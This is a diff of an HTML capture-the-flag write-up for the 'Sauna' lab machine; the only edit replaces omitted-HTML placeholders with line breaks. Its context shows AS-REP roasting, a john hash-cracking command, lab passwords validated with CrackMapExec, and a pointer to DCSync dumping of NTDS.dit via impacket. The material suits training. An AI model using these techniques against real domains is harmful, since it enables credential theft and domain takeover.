@@ -244,7 +244,7 @@ PORT     STATE SERVICE       VERSION
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/resolv.conf 
 search egotistical-bank.local
 nameserver 10.10.10.175
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h2 id="potentiels-utilisateurs-et-asreproasting">Potentiels utilisateurs et ASRepRoasting</h2>
 <p>Having no other entry point, we quickly focus on the company&rsquo;s website. Some research on the possible exploitation of the IIS server gives nothing.
 However, an interesting element attracts our attention. Indeed, the company&rsquo;s &ldquo;about&rdquo; page mentions several collaborators as well as the following note.</p>
@@ -287,7 +287,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4f51424f1adb173550e06e8404dec4fe$98c
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
 </code></pre></div><p>Bingo ! The <code>fsmith</code> account seems valid. However, the ticket is not right now usable. Indeed, it is necessary to crack it in order to retrieve the password in clear text.
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h2 id="passacracking-and-user-shell">Passacracking and user shell</h2>
 <p>Now starting a small passcracking session, using <code>john</code> and a simble famous wordlist.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo john KRB5ASREP_hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>krb5asrep
@@ -348,7 +348,7 @@ PS &gt; ls ../Desktop
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----              1/23/2020 10:03 AM    <span style="color:#ae81ff">34</span>     user.txt
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h2 id="enumeration-12-and-kerberoasting">Enumeration (1/2) and Kerberoasting</h2>
 <p>Having access to the machine and the domain, the enumeration phase can begin.
 Thinking back to the note seen before, we can assume that one user account must have privilegied rights (the &ldquo;security manager&rdquo; account).</p>
@@ -389,7 +389,7 @@ CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</spa
 CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> EGOTISTICALBANK<span style="color:#ae81ff">\h</span>smith:Thestrokes23 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KTHXBYE!
 </code></pre></div><p>However, we also quickly realize that this user does not have particularly interesting privileges for us&hellip;
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h2 id="enumeration-22-and-getting-the-secound-account">Enumeration (2/2) and getting the secound account</h2>
 <p>Since the second account recovered does not help to compromise the machine, we can run a second enumeration phase, focused on the machine and files.</p>
 <p>After some classical searches, interesting information can be recovered in the <code>WinLogon</code> registry key.</p>
@@ -439,7 +439,7 @@ CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</spa
 CME          10.10.10.175:445 SAUNA           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> EGOTISTICALBANK<span style="color:#ae81ff">\s</span>vc_loanmgr:Moneymakestheworldgoround! 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KTHXBYE!
 </code></pre></div><p>Alright ! We now have all user accounts (excepted built-in ones) !
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h2 id="ntds-dumping-and-compromission">NTDS dumping and compromission</h2>
 <p>I&rsquo;m skipping the research phase in order to go straight to the solution. The recon phase can be made through tools like <code>BloodHound</code>. This way, we can see that our <code>svc_loanmgr</code> user has the DCSynv privileges ! It turns out that the <code>svc_loanmgr</code> account has sufficient privileges to access the NTDS base of the Active Directory.</p>
 <p>So, for example, we can remotely extract the NTDS.dit file using <code>impacket</code>.</p>
